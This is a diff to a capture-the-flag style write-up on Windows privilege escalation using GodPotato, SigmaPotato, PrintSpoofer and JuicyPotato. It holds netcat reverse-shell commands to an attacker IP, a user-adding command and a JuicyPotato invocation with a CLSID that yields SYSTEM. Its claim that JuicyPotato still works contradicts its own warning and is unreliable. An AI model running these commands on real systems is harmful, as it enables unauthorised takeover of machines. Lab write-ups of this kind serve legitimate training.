@@ -129,9 +129,7 @@ Running `systeminfo` command we see:
 ![image.png](image%208.png)
 
 
-> JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
-{: .prompt-warning }
-
+-  [**GodPotato**](https://github.com/BeichenDream/GodPotato)
 
 Let’s try to perform GodPotato attack. For that we need to determine the .NET version in use:
 
@@ -163,7 +161,9 @@ Unfortunately it didn’t work:
 
 ![image.png](image%2012.png)
 
-I tried [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) attack but it didn’t work either:
+- [**SigmaPotato**](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe)
+
+I tried SigmaPotato attack but it didn’t work either:
 
 ```powershell
 .\SigmaPotato.exe "net user khan password /add”
@@ -171,15 +171,36 @@ I tried [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/downlo
 
 ![image.png](image%2013.png)
 
-Lastly I am gonna try PrintSpoofer if that also doesn’t work I am gonna search for other vectors:
+- [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)
 
-[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+Try PrintSpoofer:
 
 ```powershell
 .\PrintSpoofer.exe -c "c:\Users\kohsuke\tools\nc64.exe 10.10.14.2 135 -e cmd”
 ```
+- [**JuicyPotato**](https://github.com/ohpe/juicy-potato)
 
-It didn’t work let’s find other vectors.
+> JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 17763 onwards. 
+{: .prompt-warning }
+
+That means we can still use JuicyPotato.
+```bash
+echo 'C:\Users\kohsuke\tools\nc64.exe -e cmd.exe 10.10.14.2 9003' > priv.bat
+```
+
+Transfer both JuicyPotato.exe and priv.bat files to Windows machine using again SMB share method.
+
+Run:
+```powershell
+JuicyPotato.exe -l 9003 -p priv.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+```
+> CLSIDs of Wuauserv, Wsearch, XblGameSave and BITS services (COM components) are reliable to escalate the privileges to NT AUTHORITY\SYSTEM.
+{: .prompt-warning }
+
+I got a shell as NT Authority\System.
+![image.png](juicy.png)
+
+## Method 2
 
 Checking our user directories I found an interesting file `.kdbx`:
 
